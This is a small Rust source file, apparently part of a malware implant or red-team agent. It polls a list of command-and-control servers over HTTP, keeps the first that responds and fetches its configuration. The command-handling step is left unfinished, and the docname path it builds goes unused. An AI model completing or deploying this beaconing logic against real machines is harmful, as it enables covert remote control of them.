// Command and Control logic
use log::{error, info};

// IPv4
type Addr = String;
type Docname = String;
const QUERY: &'static str = "?input=test";

pub fn get_commands(c2: Vec<Addr>, docname: Docname) {
    if c2.is_empty() {
        error!("no c2 server specified")
    } else {
        for addr in c2 {
            // once we find a valid c2 server, stop looking
            match try_callout(&addr) {
                Ok(_) => {
                    update_conf(&addr, docname);
                    break;
                }
                Err(e) => error!("{e}"),
            }
        }
    }
}

fn update_conf(addr: &Addr, docname: Docname) -> () {
    info!("querying {:?}", addr);
    let mut dst: String = addr.clone();
    dst.push_str(&docname);

    if let Ok(response) = reqwest::blocking::get(addr) {
        if let Ok(body) = response.text() {
            todo!("{body:?}")
        }
    } else {
        error!("no response from c2 at {addr}");
    }
}

fn try_callout(addr: &Addr) -> Result<(), String> {
    info!("checking {addr}");
    if let Ok(response) = reqwest::blocking::get(addr) {
        if let Ok(body) = response.text() {
            info!("response: {body:?}");
            Ok(())
        } else {
            Err(format!("Could not read response body"))
        }
    } else {
        Err(format!("No response from c2 at {addr}"))
    }
}
